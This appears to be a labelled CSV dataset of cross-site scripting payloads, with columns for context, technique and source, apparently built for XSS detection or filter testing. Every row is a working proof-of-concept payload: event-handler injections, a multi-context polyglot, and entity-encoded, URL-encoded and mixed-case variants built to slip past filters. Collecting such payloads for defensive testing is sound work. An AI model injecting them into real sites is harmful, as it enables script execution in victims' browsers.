payload,context,technique,severity,length,source
<button popovertarget=x>Click me</button><button ontoggle=alert(1) popover id=x>AnonKryptiQuz</button>,event_handler,none,medium,102,real
"<command onmouseout=""alert(1)"">AnonKryptiQuz</command>",event_handler,none,medium,54,real
"<i onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</i>",event_handler,none,medium,59,real
"<figcaption onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,93,real
"javascript:/*""/*`/*'/*\""/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>",script_injection,comment_injection,medium,149,real
"<a draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</a>",event_handler,none,medium,79,real
<keygen onpointerleave=alert(1) style=display:block>AnonKryptiQuz</keygen>,event_handler,none,medium,74,real
"<tt oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",event_handler,none,medium,56,real
"<STYLE>li {list-style-image: url(""javascript:alert('AnonKryptiQuz')"");}</STYLE><UL><LI>AnonKryptiQuz</br>",js_uri,case_variation,medium,105,real
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,76,synthetic
<svg onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,55,synthetic
""" onerror=prompt(document.domain) """,attribute_escape,synthetic,medium,35,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",event_handler,none,medium,182,real
"%3Cscript%3E/x/prompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,medium,65,synthetic
"<dl onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dl>",event_handler,none,medium,77,real
"""><Svg onCliCk=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,52,synthetic
